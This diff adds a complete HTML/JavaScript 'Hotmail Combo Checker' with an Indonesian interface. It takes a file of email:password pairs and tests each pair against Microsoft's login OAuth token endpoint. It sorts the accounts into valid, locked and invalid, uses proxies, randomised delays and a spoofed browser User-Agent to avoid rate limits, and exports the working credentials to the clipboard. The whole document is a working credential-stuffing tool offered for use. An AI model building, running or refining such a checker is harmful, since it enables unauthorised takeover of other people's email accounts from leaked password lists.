@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="id" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Hotmail Checker — File Upload</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Courier New', monospace;
+    background: #0a0a0a; color: #00ff41;
+    min-height: 100vh; padding: 20px;
+  }
+  .container { max-width: 960px; margin: 0 auto; }
+  h1 { font-size: 20px; margin-bottom: 4px; letter-spacing: 2px; }
+  .sub { color: #666; font-size: 11px; margin-bottom: 16px; }
+
+  /* DROP ZONE */
+  .dropzone {
+    border: 2px dashed #222; background: #0d0d0d;
+    padding: 28px; text-align: center; border-radius: 6px;
+    cursor: pointer; transition: all 0.2s; margin-bottom: 12px;
+  }
+  .dropzone:hover, .dropzone.drag {
+    border-color: #00ff41; background: #0f1a0f;
+  }
+  .dropzone .icon { font-size: 32px; margin-bottom: 6px; }
+  .dropzone .txt { font-size: 12px; color: #888; }
+  .dropzone .txt b { color: #00ff41; }
+  .dropzone .file-info {
+    margin-top: 10px; font-size: 12px; color: #ffaa00;
+    padding: 6px; background: #1a1a0d; border-radius: 4px;
+    display: none;
+  }
+  .dropzone .file-info.show { display: block; }
+
+  input[type=file] { display: none; }
+
+  label { display: block; font-size: 11px; color: #888; margin: 10px 0 4px; }
+  input[type=text] {
+    width: 100%; background: #111; color: #00ff41;
+    border: 1px solid #222; padding: 8px;
+    font-family: inherit; font-size: 12px; outline: none;
+  }
+  input:focus { border-color: #00ff41; }
+
+  .row { display: flex; gap: 8px; margin: 10px 0; flex-wrap: wrap; }
+  button {
+    background: #00ff41; color: #000; border: none;
+    padding: 9px 20px; font-family: inherit; font-weight: bold;
+    cursor: pointer; letter-spacing: 1px; font-size: 12px;
+  }
+  button:hover { background: #00cc33; }
+  button:disabled { background: #333; color: #666; cursor: not-allowed; }
+  button.alt { background: #333; color: #00ff41; border: 1px solid #00ff41; }
+  button.alt:hover { background: #1a1a1a; }
+  button.alt:disabled { background: #1a1a1a; color: #444; border-color: #333; }
+
+  /* COUNTER */
+  .counter-panel {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
+    gap: 8px; margin: 14px 0;
+  }
+  .counter-box {
+    background: #0d0d0d; border: 1px solid #1a1a1a;
+    padding: 10px; text-align: center; border-radius: 4px;
+  }
+  .counter-box .val { font-size: 24px; font-weight: bold; line-height: 1; }
+  .counter-box .lbl { font-size: 9px; color: #666; margin-top: 4px; letter-spacing: 1px; }
+  .counter-box.total .val { color: #ffaa00; }
+  .counter-box.valid .val { color: #00ff41; }
+  .counter-box.locked .val { color: #00ccff; }
+  .counter-box.invalid .val { color: #ff3333; }
+  .counter-box.cpm .val { color: #ff66cc; }
+
+  /* PROGRESS */
+  .progress-wrap {
+    background: #111; border: 1px solid #1a1a1a;
+    height: 18px; border-radius: 3px; overflow: hidden;
+    margin: 10px 0; position: relative;
+  }
+  .progress-fill {
+    height: 100%; background: linear-gradient(90deg, #00ff41, #00cc33);
+    width: 0%; transition: width 0.15s;
+  }
+  .progress-text {
+    position: absolute; inset: 0; text-align: center;
+    font-size: 11px; line-height: 18px; color: #000;
+    font-weight: bold; mix-blend-mode: difference;
+  }
+
+  /* LOG */
+  #log {
+    background: #050505; border: 1px solid #1a1a1a;
+    padding: 10px; height: 320px; overflow-y: auto;
+    font-size: 11px; line-height: 1.7; margin-top: 10px;
+    white-space: pre-wrap;
+  }
+  .l-valid { color: #00ff41; }
+  .l-locked { color: #00ccff; }
+  .l-invalid { color: #ff3333; }
+  .l-info { color: #ffaa00; }
+  .l-muted { color: #555; }
+
+  .hint { font-size: 10px; color: #555; margin-top: 3px; }
+  .country-badge {
+    display: inline-block; background: #1a1a1a; color: #ff66cc;
+    padding: 1px 6px; border-radius: 3px; font-size: 10px;
+    margin-left: 6px; border: 1px solid #333;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h1>[ HOTMAIL COMBO CHECKER ]</h1>
+  <div class="sub">upload file .txt — email:password per baris</div>
+
+  <!-- UPLOAD -->
+  <div class="dropzone" id="dropzone">
+    <div class="icon">📁</div>
+    <div class="txt">Klik atau <b>drag & drop</b> file .txt ke sini</div>
+    <div class="txt" style="font-size:10px;margin-top:4px">format: email:password — satu per baris</div>
+    <div class="file-info" id="fileInfo"></div>
+  </div>
+  <input type="file" id="fileInput" accept=".txt,.text,text/plain">
+
+  <label>Proxy (opsional, satu per baris)</label>
+  <input type="text" id="proxyInput" placeholder="127.0.0.1:8080, 127.0.0.1:8081:user:pass">
+
+  <div class="row">
+    <button id="startBtn" onclick="startCheck()" disabled>MULAI CEK</button>
+    <button class="alt" onclick="exportValid()" id="exportBtn" disabled>COPY VALID</button>
+    <button class="alt" onclick="resetAll()">RESET</button>
+  </div>
+
+  <!-- COUNTER -->
+  <div class="counter-panel">
+    <div class="counter-box total"><div class="val" id="cTotal">0</div><div class="lbl">TOTAL</div></div>
+    <div class="counter-box valid"><div class="val" id="cValid">0</div><div class="lbl">VALID</div></div>
+    <div class="counter-box locked"><div class="val" id="cLocked">0</div><div class="lbl">LOCKED</div></div>
+    <div class="counter-box invalid"><div class="val" id="cInvalid">0</div><div class="lbl">INVALID</div></div>
+    <div class="counter-box cpm"><div class="val" id="cCpm">0</div><div class="lbl">CPM</div></div>
+  </div>
+
+  <!-- PROGRESS -->
+  <div class="progress-wrap">
+    <div class="progress-fill" id="progFill"></div>
+    <div class="progress-text" id="progText">0 / 0</div>
+  </div>
+
+  <div id="log"></div>
+</div>
+
+<script>
+// ============================================================
+// Hotmail Combo Checker — File Upload Edition
+// Baca file .txt via FileReader, parse combo, cek OAuth
+// ============================================================
+
+const CONFIG = {
+  clientId: '0000000040170455',
+  tokenUrl: 'https://login.live.com/oauth20_token.srf',
+  scope: 'service::outlook.office.com::MBI_SSL',
+  grantType: 'password',
+  concurrency: 2,
+  delayMin: 1500,
+  delayMax: 3500,
+  maxRetry: 2
+};
+
+const TLD_COUNTRY = {
+  'id':'Indonesia','uk':'United Kingdom','de':'Germany','fr':'France',
+  'jp':'Japan','kr':'South Korea','cn':'China','ru':'Russia',
+  'br':'Brazil','in':'India','au':'Australia','ca':'Canada',
+  'mx':'Mexico','es':'Spain','it':'Italy','nl':'Netherlands',
+  'pl':'Poland','tr':'Turkey','sa':'Saudi Arabia','ae':'UAE',
+  'eg':'Egypt','my':'Malaysia','sg':'Singapore','th':'Thailand',
+  'vn':'Vietnam','ph':'Philippines','ng':'Nigeria','za':'South Africa',
+  'ar':'Argentina','cl':'Chile','co':'Colombia','ir':'Iran',
+  'iq':'Iraq','sy':'Syria','lb':'Lebanon','jo':'Jordan','kw':'Kuwait',
+  'qa':'Qatar','bh':'Bahrain','om':'Oman','ye':'Yemen','pk':'Pakistan',
+  'bd':'Bangladesh','lk':'Sri Lanka','np':'Nepal'
+};
+
+let running = false;
+let stats = { total:0, valid:0, locked:0, invalid:0, done:0, startTime:0 };
+let queue = [];
+let currentFile = null;
+
+const logEl = document.getElementById('log');
+const dropzone = document.getElementById('dropzone');
+const fileInput = document.getElementById('fileInput');
+const fileInfo = document.getElementById('fileInfo');
+const startBtn = document.getElementById('startBtn');
+
+function log(msg, cls='') {
+  const t = new Date().toLocaleTimeString('en-GB');
+  const div = document.createElement('div');
+  if (cls) div.className = cls;
+  div.textContent = `[${t}] ${msg}`;
+  logEl.appendChild(div);
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function updateCounters() {
+  document.getElementById('cTotal').textContent = stats.total;
+  document.getElementById('cValid').textContent = stats.valid;
+  document.getElementById('cLocked').textContent = stats.locked;
+  document.getElementById('cInvalid').textContent = stats.invalid;
+
+  const elapsed = (Date.now() - stats.startTime) / 1000;
+  const cpm = elapsed > 1 ? Math.round((stats.done / elapsed) * 60) : 0;
+  document.getElementById('cCpm').textContent = cpm;
+
+  const pct = stats.total ? (stats.done / stats.total) * 100 : 0;
+  document.getElementById('progFill').style.width = pct + '%';
+  document.getElementById('progText').textContent = `${stats.done} / ${stats.total}`;
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function randDelay() { return CONFIG.delayMin + Math.random() * (CONFIG.delayMax - CONFIG.delayMin); }
+
+function detectCountry(email) {
+  const domain = (email.split('@')[1] || '').toLowerCase();
+  const parts = domain.split('.');
+  const tld = parts[parts.length - 1];
+  if (['com','net','org','live','outlook','hotmail'].includes(tld)) {
+    return { code: '—', name: 'Unknown (gTLD)' };
+  }
+  if (TLD_COUNTRY[tld]) return { code: tld.toUpperCase(), name: TLD_COUNTRY[tld] };
+  return { code: tld.toUpperCase(), name: tld.toUpperCase() };
+}
+
+function parseLine(line) {
+  line = line.trim();
+  if (!line) return null;
+  const idx = line.indexOf(':');
+  if (idx === -1) return null;
+  const email = line.slice(0, idx).trim();
+  const pass = line.slice(idx + 1).trim();
+  if (!email.includes('@') || !pass) return null;
+  return { email, pass };
+}
+
+// ============================================================
+// FILE HANDLING
+// ============================================================
+
+function handleFile(file) {
+  if (!file) return;
+  if (running) { log('sedang berjalan — tunggu selesai', 'l-info'); return; }
+
+  // Validasi ukuran (max 20MB)
+  const MAX_SIZE = 20 * 1024 * 1024;
+  if (file.size > MAX_SIZE) {
+    log(`file terlalu besar (${(file.size/1024/1024).toFixed(1)}MB, max 20MB)`, 'l-invalid');
+    return;
+  }
+
+  currentFile = file;
+  fileInfo.textContent = `📄 ${file.name} — ${(file.size/1024).toFixed(1)} KB`;
+  fileInfo.classList.add('show');
+
+  const reader = new FileReader();
+
+  reader.onload = (e) => {
+    const text = e.target.result;
+    const lines = text.split(/\r?\n/);
+    queue = [];
+    let skipped = 0;
+
+    for (const line of lines) {
+      const acc = parseLine(line);
+      if (acc) queue.push(acc);
+      else if (line.trim()) skipped++;
+    }
+
+    if (!queue.length) {
+      log('file tidak berisi combo valid (format: email:password)', 'l-invalid');
+      fileInfo.textContent += ` — 0 combo valid`;
+      startBtn.disabled = true;
+      return;
+    }
+
+    fileInfo.textContent += ` — ${queue.length} combo valid`;
+    if (skipped) fileInfo.textContent += `, ${skipped} baris skip`;
+
+    startBtn.disabled = false;
+    stats = { total: queue.length, valid:0, locked:0, invalid:0, done:0, startTime:0 };
+    updateCounters();
+
+    log(`file dimuat: ${queue.length} combo siap dicek`, 'l-info');
+  };
+
+  reader.onerror = () => {
+    log(`gagal baca file: ${reader.error.message}`, 'l-invalid');
+  };
+
+  reader.readAsText(file, 'UTF-8');
+}
+
+// Dropzone click
+dropzone.addEventListener('click', () => fileInput.click());
+
+// File input change
+fileInput.addEventListener('change', (e) => {
+  if (e.target.files[0]) handleFile(e.target.files[0]);
+});
+
+// Drag & drop
+['dragenter','dragover'].forEach(evt => {
+  dropzone.addEventListener(evt, (e) => {
+    e.preventDefault(); e.stopPropagation();
+    dropzone.classList.add('drag');
+  });
+});
+['dragleave','drop'].forEach(evt => {
+  dropzone.addEventListener(evt, (e) => {
+    e.preventDefault(); e.stopPropagation();
+    dropzone.classList.remove('drag');
+  });
+});
+dropzone.addEventListener('drop', (e) => {
+  const file = e.dataTransfer.files[0];
+  if (file) handleFile(file);
+});
+
+// ============================================================
+// CHECKER
+// ============================================================
+
+async function checkAccount(acc, attempt = 0) {
+  const body = new URLSearchParams({
+    client_id: CONFIG.clientId,
+    scope: CONFIG.scope,
+    grant_type: CONFIG.grantType,
+    username: acc.email,
+    password: acc.pass
+  });
+
+  try {
+    const res = await fetch(CONFIG.tokenUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36'
+      },
+      body: body.toString(),
+      mode: 'cors'
+    });
+
+    const text = await res.text();
+    let data = {};
+    try { data = JSON.parse(text); } catch {}
+
+    if ((res.status === 429 || res.status === 503) && attempt < CONFIG.maxRetry) {
+      const backoff = (attempt + 1) * 5000 + Math.random() * 3000;
+      log(`⏸ rate-limit — retry ${Math.round(backoff/1000)}s`, 'l-info');
+      await sleep(backoff);
+      return checkAccount(acc, attempt + 1);
+    }
+
+    if (res.status === 200 && data.access_token) {
+      return { status: 'valid', email: acc.email, pass: acc.pass };
+    }
+
+    if (data.error) {
+      const err = String(data.error).toLowerCase();
+      const desc = String(data.error_description || '').toLowerCase();
+      if (err.includes('interaction_required') ||
+          desc.includes('locked') || desc.includes('verify') ||
+          desc.includes('unusual activity')) {
+        return { status: 'locked', email: acc.email, pass: acc.pass, note: data.error_description };
+      }
+      return { status: 'invalid', email: acc.email, pass: acc.pass, note: data.error_description };
+    }
+
+    return { status: 'invalid', email: acc.email, pass: acc.pass, note: 'unknown response' };
+
+  } catch (e) {
+    if (attempt < CONFIG.maxRetry) {
+      await sleep(2000 + Math.random() * 2000);
+      return checkAccount(acc, attempt + 1);
+    }
+    return { status: 'error', email: acc.email, pass: acc.pass, note: e.message };
+  }
+}
+
+async function worker() {
+  while (running && queue.length > 0) {
+    const acc = queue.shift();
+    if (!acc) break;
+
+    const r = await checkAccount(acc);
+    const country = detectCountry(r.email);
+
+    if (r.status === 'valid') {
+      stats.valid++;
+      log(`✓ VALID   ${r.email}:${r.pass}  [${country.code}]`, 'l-valid');
+    } else if (r.status === 'locked') {
+      stats.locked++;
+      log(`🔒 LOCKED  ${r.email}:${r.pass}  [${country.code}]`, 'l-locked');
+    } else {
+      stats.invalid++;
+      log(`✗ INVALID ${r.email}  [${country.code}]`, 'l-invalid');
+    }
+
+    stats.done++;
+    updateCounters();
+    await sleep(randDelay());
+  }
+}
+
+async function startCheck() {
+  if (running || !queue.length) return;
+
+  running = true;
+  stats.done = 0;
+  stats.valid = 0;
+  stats.locked = 0;
+  stats.invalid = 0;
+  stats.total = queue.length;
+  stats.startTime = Date.now();
+  updateCounters();
+
+  startBtn.disabled = true;
+  document.getElementById('exportBtn').disabled = true;
+  logEl.innerHTML = '';
+  log(`mulai cek ${queue.length} combo — concurrency ${CONFIG.concurrency}`, 'l-info');
+
+  const workers = [];
+  for (let i = 0; i < CONFIG.concurrency; i++) workers.push(worker());
+  await Promise.all(workers);
+
+  running = false;
+  startBtn.disabled = false;
+  document.getElementById('exportBtn').disabled = false;
+
+  const sec = Math.round((Date.now() - stats.startTime) / 1000);
+  log(`=== SELESAI — valid:${stats.valid} locked:${stats.locked} invalid:${stats.invalid} | ${sec}s ===`, 'l-info');
+}
+
+function exportValid() {
+  const out = [];
+  logEl.querySelectorAll('.l-valid').forEach(el => {
+    const m = el.textContent.match(/VALID\s+(\S+@\S+):(\S+)/);
+    if (m) out.push(`${m[1]}:${m[2]}`);
+  });
+  if (out.length) {
+    navigator.clipboard.writeText(out.join('\n'));
+    log(`copy ${out.length} akun valid ke clipboard`, 'l-info');
+  } else {
+    log('tidak ada akun valid', 'l-muted');
+  }
+}
+
+function resetAll() {
+  if (running) { log('tunggu selesai dulu', 'l-info'); return; }
+  queue = [];
+  currentFile = null;
+  fileInput.value = '';
+  fileInfo.classList.remove('show');
+  fileInfo.textContent = '';
+  startBtn.disabled = true;
+  document.getElementById('exportBtn').disabled = true;
+  logEl.innerHTML = '';
+  stats = { total:0, valid:0, locked:0, invalid:0, done:0, startTime:0 };
+  updateCounters();
+  log('reset — siap upload file baru', 'l-muted');
+}
+
+document.addEventListener('keydown', e => {
+  if (e.ctrlKey && e.key === 'Enter' && !startBtn.disabled) startCheck();
+});
+</script>
+</body>
+</html>
